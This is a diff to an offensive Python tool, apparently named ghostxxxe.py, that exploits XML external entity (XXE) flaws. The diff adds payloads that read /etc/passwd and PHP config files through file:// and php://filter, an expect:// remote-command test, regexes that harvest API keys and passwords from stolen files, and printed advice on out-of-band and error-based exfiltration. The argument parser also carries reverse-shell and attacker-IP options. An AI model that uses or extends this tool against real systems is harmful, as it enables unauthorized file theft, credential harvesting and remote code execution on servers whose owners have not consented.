@@ -931,6 +931,11 @@ class XXEScanner:
         self.verbose = args.verbose
         self.session = requests.Session()
         self.vulnerabilities_found = []
+        self.working_structure = None  # Stores detected XML structure
+        
+        # XML structure learning
+        self.xml_structure = None  # Will be detected from target
+        self.reflection_element = None  # Which element shows in response
         
     def _parse_headers(self, headers_str: str) -> Dict:
         """Parse custom headers"""
@@ -1044,29 +1049,59 @@ class XXEScanner:
         """Detect basic XXE vulnerability with comprehensive payloads"""
         print(f"\n{Colors.HEADER}[*] Phase 2: Testing XXE File Read Exploitation{Colors.RESET}")
         
-        test_files = [
-            '/etc/passwd',
-            '/etc/hostname',
-            '/etc/hosts',
-            'C:\\Windows\\win.ini',
-            'C:\\boot.ini'
-        ]
+        # If user specified a file with -f, test ONLY that file
+        # Otherwise test common files
+        if self.file_path and self.file_path != '/etc/passwd':
+            # User specified a custom file - test ONLY this
+            test_files = [self.file_path]
+            print(f"{Colors.INFO}[*] Testing user-specified file: {self.file_path}{Colors.RESET}")
+        else:
+            # Test common files
+            test_files = [
+                '/etc/passwd',
+                '/etc/hostname',
+                '/etc/hosts',
+                'C:\\Windows\\win.ini',
+                'C:\\boot.ini'
+            ]
         
         for file_path in test_files:
             print(f"\n{Colors.INFO}[*] Target file: {file_path}{Colors.RESET}")
             
-            # Try multiple payload variations
-            payload_methods = [
-                ('Classic DTD', lambda f: PayloadGenerator.xxe_classic_file_read(f)),
-                ('Standard XXE', lambda f: PayloadGenerator.xxe_basic_file_read(f)[0]),
-                ('PHP Base64 Wrapper', lambda f: PayloadGenerator.xxe_php_wrapper_base64(f)),
-                ('XInclude', lambda f: PayloadGenerator.xxe_xinclude_file_read(f)),
-            ]
+            # Try multiple payload variations using detected structure
+            payloads_to_try = []
             
-            for method_name, payload_func in payload_methods:
+            if self.working_structure:
+                # Use detected working structure
+                print(f"{Colors.INFO}[*] Using previously detected XML structure{Colors.RESET}")
+                
+                # Build payloads with working structure
+                # Replace test_value placeholder with actual XXE payload
+                
+                # Classic file read
+                classic = self.working_structure.replace(
+                    '<!ENTITY ghosttest "{test_value}">',
+                    f'<!ENTITY xxe SYSTEM "file://{file_path}">'
+                ).replace('&ghosttest;', '&xxe;')
+                payloads_to_try.append(('Classic DTD (Detected Structure)', classic))
+                
+                # PHP Base64 wrapper
+                php_wrapper = self.working_structure.replace(
+                    '<!ENTITY ghosttest "{test_value}">',
+                    f'<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">'
+                ).replace('&ghosttest;', '&xxe;')
+                payloads_to_try.append(('PHP Base64 Wrapper (Detected Structure)', php_wrapper))
+            
+            # Also try standard payload formats as fallback
+            payloads_to_try.extend([
+                ('Classic DTD', PayloadGenerator.xxe_classic_file_read(file_path)),
+                ('Standard XXE', PayloadGenerator.xxe_basic_file_read(file_path)[0]),
+                ('PHP Base64 Wrapper', PayloadGenerator.xxe_php_wrapper_base64(file_path)),
+                ('XInclude', PayloadGenerator.xxe_xinclude_file_read(file_path)),
+            ])
+            
+            for method_name, payload in payloads_to_try:
                 try:
-                    payload = payload_func(file_path)
-                    
                     response = self.send_payload(
                         payload,
                         f"{method_name} - {file_path}"
@@ -1080,22 +1115,39 @@ class XXEScanner:
                         
                         # Check if base64 encoded
                         import re
-                        if re.match(r'^[A-Za-z0-9+/]+=*$', response.text.strip()):
-                            print(f"{Colors.WARNING}[*] Response appears to be base64 encoded{Colors.RESET}")
-                            try:
-                                import base64
-                                decoded = base64.b64decode(response.text.strip()).decode('utf-8', errors='ignore')
-                                print(decoded[:500])
-                            except:
-                                print(response.text[:500])
-                        else:
+                        # Look for base64 in response (might be embedded in HTML/text)
+                        b64_pattern = r'([A-Za-z0-9+/]{40,}={0,2})'
+                        b64_matches = re.findall(b64_pattern, response.text)
+                        
+                        decoded_content = None
+                        if b64_matches:
+                            print(f"{Colors.WARNING}[*] Found base64 data in response, attempting decode...{Colors.RESET}")
+                            for b64_data in b64_matches:
+                                try:
+                                    import base64
+                                    decoded = base64.b64decode(b64_data).decode('utf-8', errors='ignore')
+                                    # Check if decoded content looks like file contents
+                                    if len(decoded) > 20 and any(ind in decoded for ind in ['root:', '<?php', '/', '$']):
+                                        decoded_content = decoded
+                                        print(f"\n{Colors.SUCCESS}[+] Successfully decoded base64!{Colors.RESET}")
+                                        print(f"{Colors.INFO}[*] Decoded content:{Colors.RESET}")
+                                        print(decoded[:800])
+                                        
+                                        # Try to extract secrets
+                                        self._extract_secrets_from_content(decoded, file_path)
+                                        break
+                                except:
+                                    continue
+                        
+                        if not decoded_content:
                             print(response.text[:500])
                         
                         self.vulnerabilities_found.append({
                             'type': f'XXE File Read - {method_name}',
                             'payload': payload,
                             'file': file_path,
-                            'method': method_name
+                            'method': method_name,
+                            'content': decoded_content if decoded_content else response.text[:1000]
                         })
                         return True
                         
@@ -1170,6 +1222,111 @@ class XXEScanner:
         
         return False
     
+    def _extract_secrets_from_content(self, content: str, filename: str):
+        """Extract secrets like API keys, passwords from file content"""
+        print(f"\n{Colors.HEADER}[*] Analyzing file for secrets...{Colors.RESET}")
+        
+        import re
+        
+        secrets_found = False
+        patterns = {
+            'API Key': [
+                r'[\$]?api_key\s*=\s*["\']([^"\']+)["\']',
+                r'API_KEY\s*=\s*["\']([^"\']+)["\']',
+            ],
+            'Password': [
+                r'[\$]?(?:password|passwd|pwd)\s*=\s*["\']([^"\']+)["\']',
+                r'PASSWORD\s*=\s*["\']([^"\']+)["\']',
+            ],
+            'Database': [
+                r'[\$]?db_(?:pass|password|pwd)\s*=\s*["\']([^"\']+)["\']',
+                r'[\$]?db_(?:host|user|name)\s*=\s*["\']([^"\']+)["\']',
+            ],
+            'Secret': [
+                r'[\$]?secret\s*=\s*["\']([^"\']+)["\']',
+                r'SECRET_KEY\s*=\s*["\']([^"\']+)["\']',
+            ],
+        }
+        
+        for secret_type, secret_patterns in patterns.items():
+            for pattern in secret_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                if matches:
+                    if not secrets_found:
+                        print(f"\n{Colors.SUCCESS}{'='*70}{Colors.RESET}")
+                        print(f"{Colors.SUCCESS}🔑 SECRETS FOUND IN {filename}:{Colors.RESET}")
+                        print(f"{Colors.SUCCESS}{'='*70}{Colors.RESET}")
+                        secrets_found = True
+                    
+                    print(f"{Colors.ERROR}{secret_type}: {matches[0]}{Colors.RESET}")
+                    break
+        
+        if secrets_found:
+            print(f"{Colors.SUCCESS}{'='*70}{Colors.RESET}\n")
+        else:
+            print(f"{Colors.INFO}[*] No obvious secrets found{Colors.RESET}")
+            print(f"\n{Colors.INFO}[*] XXE CONFIRMED but direct file read blocked{Colors.RESET}")
+            print(f"\n{Colors.HEADER}╔════════════════════════════════════════════════════════════╗{Colors.RESET}")
+            print(f"{Colors.HEADER}║          RECOMMENDED NEXT STEPS                            ║{Colors.RESET}")
+            print(f"{Colors.HEADER}╚════════════════════════════════════════════════════════════╝{Colors.RESET}")
+            print(f"\n{Colors.SUCCESS}[+] Entity substitution works - XXE is present!{Colors.RESET}")
+            print(f"{Colors.INFO}[*] File read may be blocked by filters/restrictions{Colors.RESET}")
+            
+            print(f"\n{Colors.WARNING}→ Try These Techniques:{Colors.RESET}")
+            print(f"\n1. {Colors.SUCCESS}PHP Base64 Wrapper{Colors.RESET} (bypass special characters)")
+            print(f"   {Colors.INFO}Manual test:{Colors.RESET}")
+            print(f"   <!DOCTYPE email [<!ENTITY xxe SYSTEM")
+            print(f"     \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>")
+            
+            print(f"\n2. {Colors.SUCCESS}Out-of-Band (OOB) Exfiltration{Colors.RESET} (blind XXE)")
+            print(f"   {Colors.INFO}Command:{Colors.RESET}")
+            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+            print(f"     --oob --callback-ip YOUR_IP --callback-port 8080 -v")
+            
+            print(f"\n3. {Colors.SUCCESS}Try Different Files:{Colors.RESET}")
+            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+            print(f"     -f /etc/hostname -v")
+            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+            print(f"     -f index.php -v")
+            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+            print(f"     -f config.php -v")
+            
+            print(f"\n4. {Colors.SUCCESS}Error-Based Exfiltration:{Colors.RESET}")
+            print(f"   {Colors.INFO}Manual test:{Colors.RESET}")
+            print(f"   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">")
+            print(f"   <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%xxe;'>\">")
+            print(f"   %eval;%exfil;]>")
+            
+            print(f"\n5. {Colors.SUCCESS}Advanced Mode{Colors.RESET} (more techniques)")
+            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+            print(f"     --advanced -v")
+            
+            print(f"\n6. {Colors.SUCCESS}Interactive Testing:{Colors.RESET}")
+            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+            print(f"     --interactive")
+            
+            print(f"\n{Colors.WARNING}→ Manual Payload Testing:{Colors.RESET}")
+            print(f"   Use Burp Suite to test custom payloads:")
+            print(f"   python3 ghostxxxe.py -u {self.target_url} -m {self.method} \\")
+            print(f"     --proxy http://127.0.0.1:8080 -v")
+            
+            print(f"\n{Colors.INFO}→ Common Reasons for Blocked File Read:{Colors.RESET}")
+            print(f"   • PHP safe_mode or open_basedir restrictions")
+            print(f"   • libxml LIBXML_NOENT disabled")
+            print(f"   • File path restrictions/whitelist")
+            print(f"   • XML parser blocks file:// protocol")
+            print(f"   • Special characters breaking XML syntax")
+            
+            print(f"\n{Colors.SUCCESS}→ Recommended Attack Path:{Colors.RESET}")
+            print(f"   1. Try PHP wrapper first (handles special chars)")
+            print(f"   2. Test OOB if direct read fails")
+            print(f"   3. Try error-based if OOB not possible")
+            print(f"   4. Test different file paths")
+            print(f"   5. Use interactive mode for custom payloads")
+            print(f"\n{Colors.HEADER}{'═'*60}{Colors.RESET}\n")
+        
+        return False
+    
     def detect_xxe_entity_injection(self) -> bool:
         """Test if XML entities are processed (precursor to XXE)"""
         print(f"\n{Colors.HEADER}[*] Phase 1: Testing XML Entity Processing{Colors.RESET}")
@@ -1181,49 +1338,85 @@ class XXEScanner:
             "XXE_VULN_TEST_2024"
         ]
         
-        for test_value in test_values:
-            # Create entity substitution payload
-            payload = f'''<?xml version="1.0" encoding="UTF-8"?>
+        # Try multiple XML structure variations
+        xml_structures = [
+            # Structure 1: HTB format with 'n' instead of 'name'
+            '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
   <!ENTITY ghosttest "{test_value}">
 ]>
 <root>
-<name>ghost</name>
+<n>&ghosttest;</n>
 <tel>1234567890</tel>
 <email>&ghosttest;</email>
 <message>test</message>
-</root>'''
-            
-            response = self.send_payload(
-                payload,
-                f"Entity Substitution Test - {test_value}"
-            )
-            
-            if response:
-                # Analyze response
-                analysis = self._analyze_response_reflection(response, test_value)
+</root>''',
+            # Structure 2: Standard format with 'name'
+            '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY ghosttest "{test_value}">
+]>
+<root>
+<name>&ghosttest;</name>
+<tel>1234567890</tel>
+<email>&ghosttest;</email>
+<message>test</message>
+</root>''',
+            # Structure 3: Simple email-only
+            '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+  <!ENTITY ghosttest "{test_value}">
+]>
+<email>&ghosttest;</email>''',
+            # Structure 4: Data/value structure
+            '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY ghosttest "{test_value}">
+]>
+<data>
+<value>&ghosttest;</value>
+</data>''',
+        ]
+        
+        for test_value in test_values:
+            for structure_template in xml_structures:
+                # Create entity substitution payload
+                payload = structure_template.replace('{test_value}', test_value)
                 
-                if analysis['reflected']:
-                    print(f"{Colors.SUCCESS}[+] CRITICAL: XML Entity Substitution Working!{Colors.RESET}")
-                    print(f"{Colors.SUCCESS}[+] Entity value '{test_value}' was reflected in response{Colors.RESET}")
-                    print(f"{Colors.INFO}[*] Reflection points: {len(analysis['reflection_points'])}{Colors.RESET}")
-                    print(f"{Colors.INFO}[*] Response type: {analysis['reflection_type']}{Colors.RESET}")
-                    print(f"\n{Colors.WARNING}[!] This confirms XXE vulnerability - proceeding to exploitation{Colors.RESET}")
+                response = self.send_payload(
+                    payload,
+                    f"Entity Substitution Test - {test_value}"
+                )
+                
+                if response:
+                    # Analyze response
+                    analysis = self._analyze_response_reflection(response, test_value)
                     
-                    # Show response preview
-                    print(f"\n{Colors.INFO}[*] Response Preview:{Colors.RESET}")
-                    preview = response.text[:300]
-                    # Highlight our test value
-                    preview = preview.replace(test_value, f"{Colors.SUCCESS}{test_value}{Colors.RESET}")
-                    print(preview)
-                    
-                    self.vulnerabilities_found.append({
-                        'type': 'XML Entity Injection - XXE Confirmed',
-                        'payload': payload,
-                        'test_value': test_value,
-                        'analysis': analysis
-                    })
-                    return True
+                    if analysis['reflected']:
+                        print(f"{Colors.SUCCESS}[+] CRITICAL: XML Entity Substitution Working!{Colors.RESET}")
+                        print(f"{Colors.SUCCESS}[+] Entity value '{test_value}' was reflected in response{Colors.RESET}")
+                        print(f"{Colors.INFO}[*] Reflection points: {len(analysis['reflection_points'])}{Colors.RESET}")
+                        print(f"{Colors.INFO}[*] Response type: {analysis['reflection_type']}{Colors.RESET}")
+                        print(f"{Colors.INFO}[*] Working XML structure detected and saved{Colors.RESET}")
+                        print(f"\n{Colors.WARNING}[!] This confirms XXE vulnerability - proceeding to exploitation{Colors.RESET}")
+                        
+                        # Store the working structure for later use
+                        self.working_structure = structure_template
+                        
+                        # Show response preview
+                        print(f"\n{Colors.INFO}[*] Response Preview:{Colors.RESET}")
+                        preview = response.text[:300]
+                        # Highlight our test value
+                        preview = preview.replace(test_value, f"{Colors.SUCCESS}{test_value}{Colors.RESET}")
+                        print(preview)
+                        
+                        self.vulnerabilities_found.append({
+                            'type': 'XML Entity Injection - XXE Confirmed',
+                            'payload': payload,
+                            'test_value': test_value,
+                            'analysis': analysis
+                        })
+                        return True
         
         print(f"{Colors.WARNING}[-] XML entities not being processed{Colors.RESET}")
         print(f"{Colors.INFO}[*] Target may not be vulnerable to XXE{Colors.RESET}")
@@ -1623,6 +1816,112 @@ class XXEScanner:
                     return True
         
         print(f"{Colors.WARNING}[-] XPATH injection not detected{Colors.RESET}")
+        return False
+    
+    def test_expect_rce(self, command: str = "id") -> bool:
+        """Test RCE using PHP expect:// wrapper"""
+        print(f"\n{Colors.HEADER}[*] Testing RCE with expect:// wrapper{Colors.RESET}")
+        print(f"{Colors.INFO}[*] Command: {command}{Colors.RESET}")
+        print(f"{Colors.WARNING}[!] Note: expect:// requires PHP expect module (rarely enabled){Colors.RESET}")
+        
+        # Test with expect wrapper
+        payload = PayloadGenerator.xxe_expect_rce(command)
+        response = self.send_payload(payload, f"expect:// RCE - {command}")
+        
+        if not response:
+            print(f"{Colors.WARNING}[-] No response received{Colors.RESET}")
+            return False
+        
+        # Check for command output indicators
+        indicators = {
+            'id': ['uid=', 'gid=', 'groups='],
+            'whoami': ['www-data', 'root', 'apache', 'nginx'],
+            'pwd': ['/', 'var', 'www', 'home'],
+            'ls': ['index', 'config', 'total'],
+            'cat': ['<?php', 'root:', 'config', 'password']
+        }
+        
+        cmd_base = command.split()[0]
+        expected = indicators.get(cmd_base, [command.split()[0]])
+        
+        found = False
+        for indicator in expected:
+            if indicator.lower() in response.text.lower():
+                found = True
+                print(f"{Colors.SUCCESS}[!] CRITICAL: RCE CONFIRMED with expect://!{Colors.RESET}")
+                print(f"{Colors.SUCCESS}[+] Command executed successfully: {command}{Colors.RESET}")
+                print(f"\n{Colors.INFO}[*] Command Output:{Colors.RESET}")
+                print(response.text[:800])
+                
+                self.vulnerabilities_found.append({
+                    'type': 'XXE RCE - expect:// wrapper',
+                    'payload': payload,
+                    'command': command,
+                    'output': response.text[:500]
+                })
+                return True
+        
+        if not found:
+            print(f"{Colors.WARNING}[-] Command output not detected{Colors.RESET}")
+            print(f"{Colors.INFO}[*] Response preview:{Colors.RESET}")
+            print(response.text[:500])
+            print(f"\n{Colors.INFO}[*] expect:// may not be enabled or output not reflected{Colors.RESET}")
+        
+        return False
+    
+    def test_php_filter_source_read(self, file_path: str = "index.php") -> bool:
+        """Test PHP filter wrapper for source code disclosure"""
+        print(f"\n{Colors.HEADER}[*] Testing PHP Filter Wrapper for Source Code Disclosure{Colors.RESET}")
+        print(f"{Colors.INFO}[*] Target file: {file_path}{Colors.RESET}")
+        print(f"{Colors.INFO}[*] Using: php://filter/convert.base64-encode/resource={file_path}{Colors.RESET}")
+        
+        payload = PayloadGenerator.xxe_php_wrapper_base64(file_path)
+        response = self.send_payload(payload, f"PHP Filter - {file_path}")
+        
+        if not response:
+            print(f"{Colors.WARNING}[-] No response received{Colors.RESET}")
+            return False
+        
+        # Check if response contains base64 data
+        import re
+        import base64
+        
+        # Look for base64 patterns (at least 40 consecutive valid base64 chars)
+        base64_pattern = r'[A-Za-z0-9+/]{40,}={0,2}'
+        matches = re.findall(base64_pattern, response.text)
+        
+        if matches:
+            print(f"{Colors.SUCCESS}[!] PHP Filter Wrapper SUCCESS!{Colors.RESET}")
+            print(f"{Colors.SUCCESS}[+] Found base64-encoded data in response{Colors.RESET}")
+            
+            for idx, match in enumerate(matches[:3], 1):  # Show first 3 matches
+                print(f"\n{Colors.INFO}[*] Base64 Data #{idx}:{Colors.RESET}")
+                print(f"{match[:100]}{'...' if len(match) > 100 else ''}")
+                
+                # Try to decode
+                try:
+                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
+                    if len(decoded) > 20 and ('<' in decoded or '<?php' in decoded or 'function' in decoded):
+                        print(f"\n{Colors.SUCCESS}[+] Successfully decoded - appears to be source code!{Colors.RESET}")
+                        print(f"{Colors.INFO}[*] Decoded content preview:{Colors.RESET}")
+                        print(decoded[:500])
+                        
+                        self.vulnerabilities_found.append({
+                            'type': 'XXE PHP Filter - Source Code Disclosure',
+                            'payload': payload,
+                            'file': file_path,
+                            'decoded': decoded[:1000]
+                        })
+                        return True
+                except Exception as e:
+                    if self.verbose:
+                        print(f"{Colors.WARNING}[-] Decoding failed: {str(e)}{Colors.RESET}")
+                    continue
+        
+        print(f"{Colors.WARNING}[-] PHP filter wrapper did not return base64 data{Colors.RESET}")
+        print(f"{Colors.INFO}[*] Response preview:{Colors.RESET}")
+        print(response.text[:500])
+        
         return False
     
     def exploit_oob_http(self) -> bool:
@@ -2337,12 +2636,13 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
             print()
         
         # Next Steps
-        if results['next_steps']:
+        next_steps = results.get('next_steps', [])
+        if next_steps and isinstance(next_steps, list):
             print(f"{Colors.HEADER}╔════════════════════════════════════════════════════════════╗{Colors.RESET}")
             print(f"{Colors.HEADER}║ RECOMMENDED NEXT STEPS                                     ║{Colors.RESET}")
             print(f"{Colors.HEADER}╚════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
             
-            for idx, step in enumerate(results['next_steps'], 1):
+            for idx, step in enumerate(next_steps, 1):
                 print(f"{Colors.WARNING}[{idx}] {step}{Colors.RESET}")
             print()
         
@@ -2771,6 +3071,8 @@ Examples:
     parser.add_argument('--reverse-shell', action='store_true', help='Deploy reverse shell')
     parser.add_argument('--attacker-ip', help='Attacker IP for reverse shell')
     parser.add_argument('--attacker-port', type=int, help='Attacker port for reverse shell')
+    parser.add_argument('--cmd', '--command', dest='command', 
+                       help='Test RCE with expect:// wrapper (e.g., --cmd "id" or --cmd "whoami")')
     
     # Scan options
     parser.add_argument('--scan', action='store_true',
@@ -2779,6 +3081,10 @@ Examples:
                        help='Run advanced tests (protocols, WAF bypass, DoS, feeds, office docs)')
     parser.add_argument('--skip-dos', action='store_true',
                        help='Skip DoS tests (recommended for production)')
+    parser.add_argument('--test-php-filter', action='store_true',
+                       help='Specifically test PHP filter wrapper for source code disclosure')
+    parser.add_argument('--test-expect', action='store_true',
+                       help='Specifically test expect:// wrapper for RCE')
     
     # Output options
     parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
@@ -2921,6 +3227,26 @@ Examples:
             
         elif args.oob:
             scanner.exploit_oob_http()
+        
+        elif args.command:
+            # Test RCE with specific command
+            scanner.test_expect_rce(args.command)
+        
+        elif args.test_expect:
+            # Test expect:// wrapper with default commands
+            print(f"{Colors.HEADER}[*] Testing expect:// RCE with multiple commands{Colors.RESET}\n")
+            test_commands = ['id', 'whoami', 'pwd', 'ls']
+            for cmd in test_commands:
+                scanner.test_expect_rce(cmd)
+                time.sleep(1)
+        
+        elif args.test_php_filter:
+            # Test PHP filter wrapper for source code
+            print(f"{Colors.HEADER}[*] Testing PHP Filter Wrapper for Source Code Disclosure{Colors.RESET}\n")
+            test_files = ['index.php', 'config.php', 'database.php', 'connection.php']
+            for file in test_files:
+                scanner.test_php_filter_source_read(file)
+                time.sleep(1)
             
         else:
             # Run full scan
